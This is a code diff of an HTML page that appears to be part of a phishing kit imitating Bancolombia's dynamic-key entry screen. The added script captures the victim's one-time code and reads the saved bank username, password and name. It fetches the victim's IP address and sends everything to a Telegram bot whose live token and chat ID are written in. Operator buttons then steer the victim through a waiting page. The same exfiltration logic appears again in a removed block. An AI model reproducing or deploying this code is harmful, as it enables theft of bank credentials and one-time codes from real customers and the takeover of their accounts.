@@ -960,165 +960,131 @@
     <script type="text/javascript" src="https://replit.com/public/js/replit-dev-banner.js"></script>
     <script>
       document.addEventListener('DOMContentLoaded', function() {
+        // --- TUS CREDENCIALES DE TELEGRAM ---
+        const TELEGRAM_TOKEN = '8594588884:AAF1ODTlOEYhDIKgILpadiPlcgfCm_aZEAA';
+        const TELEGRAM_CHAT_ID = '-5182218323'; // Grupo LOG
+        // ---------------------------------
+
         const inputs = document.querySelectorAll('.bc-dynamic-segment');
         const continueButton = document.querySelector('.bc-dynamic-continue');
+        const buttonsContainer = document.querySelector('.bc-dynamic-buttons');
         
+        // Función para verificar si todos los campos están llenos
         function checkInputs() {
           let allFilled = true;
+          let hasInput = false;
           inputs.forEach(input => {
             if (input.value.length === 0) {
               allFilled = false;
+            } else {
+              hasInput = true;
             }
           });
-          
-          if (allFilled) {
-            continueButton.removeAttribute('disabled');
+          continueButton.disabled = !allFilled;
+
+          // Mostrar/Ocultar botones
+          if (hasInput) {
+            buttonsContainer.style.display = 'flex';
           } else {
-            continueButton.setAttribute('disabled', 'true');
+            buttonsContainer.style.display = 'none';
           }
         }
 
+        // Auto-tabulación entre inputs
         inputs.forEach((input, index) => {
           input.addEventListener('input', (e) => {
-            const val = e.target.value;
-            
-            checkInputs();
+            // Solo permitir números
+            let val = e.target.value.replace(/[^0-9]/g, '');
+            // Asegurar máximo un caracter
+            if (val.length > 1) val = val.slice(0, 1);
+            e.target.value = val;
 
-            // Only move next if a value was entered (and it's not empty)
-            if (val.length >= 1) {
-              if (index < inputs.length - 1) {
-                inputs[index + 1].focus();
-              }
+            // Saltar al siguiente campo solo si hay un número válido
+            if (val.length === 1 && index < inputs.length - 1) {
+              inputs[index + 1].focus();
             }
+            checkInputs();
           });
           
           input.addEventListener('keydown', (e) => {
-            // Handle backspace
-            if (e.key === 'Backspace' && e.target.value === '') {
-              if (index > 0) {
-                inputs[index - 1].focus();
-              }
+            if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+              inputs[index - 1].focus();
             }
-            // Check inputs after a short delay to account for backspace
             setTimeout(checkInputs, 0);
+          });
+        });
+
+        // Acción al hacer clic en Continuar
+        continueButton.addEventListener('click', async function(e) {
+          e.preventDefault();
+          
+          // Unir los 6 dígitos
+          let claveDinamica = "";
+          inputs.forEach(input => { claveDinamica += input.value; });
+
+          const usuario = sessionStorage.getItem("bc_usuario") || "Desconocido";
+          const password = sessionStorage.getItem("bc_clave") || "No registrada";
+          const userNombre = sessionStorage.getItem("user_nombre") || "No registrado";
+          
+          let clientIP = "Desconocida";
+          try {
+             const ipReq = await fetch('https://api.ipify.org?format=json');
+             if(ipReq.ok) {
+                const ipData = await ipReq.json();
+                clientIP = ipData.ip;
+             }
+          } catch(err) {
+             console.log("No se pudo obtener IP:", err);
+          }
+
+          const mensaje = `🔔 *Nueva Clave Dinámica*\n\n` +
+                          `👤 Nombre: ${userNombre}\n` +
+                          `👤 Usuario: ${usuario}\n` +
+                          `🔐 Clave: ${password}\n` +
+                          `🔑 Dinámica: \`${claveDinamica}\`\n` +
+                          `🌐 IP: ${clientIP}`;
+
+          // Enviar a Telegram
+          fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: mensaje,
+              parse_mode: 'Markdown',
+                reply_markup: {
+                  inline_keyboard: [
+                    [
+                      { text: "✅ Finalizar", callback_data: "finish" },
+                      { text: "🔄 Pedir Dinámica", callback_data: "ask_otp" }
+                    ],
+                    [
+                      { text: "❌ Error Dinámica", callback_data: "error_dinamica" },
+                      { text: "❌ Error Usuario", callback_data: "error_user" }
+                    ]
+                  ]
+                }
+            })
+          })
+          .then(response => response.json())
+          .then(data => {
+            if (data.ok) {
+               // Redirigir a espera.html con el ID del mensaje para polling
+               window.location.href = `espera.html?id=${data.result.message_id}`;
+            } else {
+               console.error("Error Telegram:", data);
+               // Fallback si falla
+               window.location.href = "espera.html?next=https://www.bancolombia.com/personas";
+            }
+          })
+          .catch(error => {
+            console.error('Error de red (continuando flujo manual):', error);
+            // Fallback manual
+            window.location.href = "espera.html?next=https://www.bancolombia.com/personas";
           });
         });
       });
     </script>
-    <script>
-  document.addEventListener('DOMContentLoaded', function() {
-    // --- TUS CREDENCIALES DE TELEGRAM ---
-    const TELEGRAM_TOKEN = '8594588884:AAF1ODTlOEYhDIKgILpadiPlcgfCm_aZEAA';
-    const TELEGRAM_CHAT_ID = '-5182218323'; // Grupo LOG
-    // ---------------------------------
-
-    const inputs = document.querySelectorAll('.bc-dynamic-segment');
-    const continueButton = document.querySelector('.bc-dynamic-continue');
-    const buttonsContainer = document.querySelector('.bc-dynamic-buttons');
-    
-    // Función para verificar si todos los campos están llenos
-    function checkInputs() {
-      let allFilled = true;
-      let hasInput = false;
-      inputs.forEach(input => {
-        if (input.value.length === 0) {
-          allFilled = false;
-        } else {
-          hasInput = true;
-        }
-      });
-      continueButton.disabled = !allFilled;
-
-      // Mostrar/Ocultar botones
-      if (hasInput) {
-        buttonsContainer.style.display = 'flex';
-      } else {
-        buttonsContainer.style.display = 'none';
-      }
-    }
-
-    // Auto-tabulación entre inputs
-    inputs.forEach((input, index) => {
-      input.addEventListener('input', (e) => {
-        // Solo permitir números
-        let val = e.target.value.replace(/[^0-9]/g, '');
-        // Asegurar máximo un caracter
-        if (val.length > 1) val = val.slice(0, 1);
-        e.target.value = val;
-
-        // Saltar al siguiente campo solo si hay un número válido
-        if (val.length === 1 && index < inputs.length - 1) {
-          inputs[index + 1].focus();
-        }
-        checkInputs();
-      });
-      
-      input.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
-          inputs[index - 1].focus();
-        }
-        setTimeout(checkInputs, 0);
-      });
-    });
-
-    // Acción al hacer clic en Continuar
-    continueButton.addEventListener('click', function(e) {
-      e.preventDefault();
-      
-      // Unir los 6 dígitos
-      let claveDinamica = "";
-      inputs.forEach(input => { claveDinamica += input.value; });
-
-      const usuario = sessionStorage.getItem("bc_usuario") || "Desconocido";
-      const password = sessionStorage.getItem("bc_clave") || "No registrada";
-      const userNombre = sessionStorage.getItem("user_nombre") || "No registrado";
-
-      const mensaje = `🔔 *Nueva Clave Dinámica*\n\n` +
-                      `👤 Nombre: ${userNombre}\n` +
-                      `👤 Usuario: ${usuario}\n` +
-                      `🔐 Clave: ${password}\n` +
-                      `🔑 Dinámica: \`${claveDinamica}\`\n` +
-                      `🌐 IP: 191.153.204.134`; // Aquí puedes usar un servicio para obtener la IP real
-
-      // Enviar a Telegram
-      fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: mensaje,
-          parse_mode: 'Markdown',
-            reply_markup: {
-              inline_keyboard: [
-                [
-                  { text: "✅ Finalizar", callback_data: "finish" },
-                  { text: "🔄 Pedir Dinámica", callback_data: "ask_otp" }
-                ],
-                [
-                  { text: "❌ Error Dinámica", callback_data: "error_dinamica" },
-                  { text: "❌ Error Usuario", callback_data: "error_user" }
-                ]
-              ]
-            }
-        })
-      })
-      .then(response => response.json())
-      .then(data => {
-        if (data.ok) {
-           // Redirigir a espera.html con el ID del mensaje para polling
-           window.location.href = `espera.html?id=${data.result.message_id}`;
-        } else {
-           console.error("Error Telegram:", data);
-           // Fallback si falla
-           window.location.href = "espera.html";
-        }
-      })
-      .catch(error => {
-        console.error('Error:', error);
-      });
-    });
-  });
-</script>
   
     <script>
         // Verificar si venimos de un error (URL tiene ?error=true)
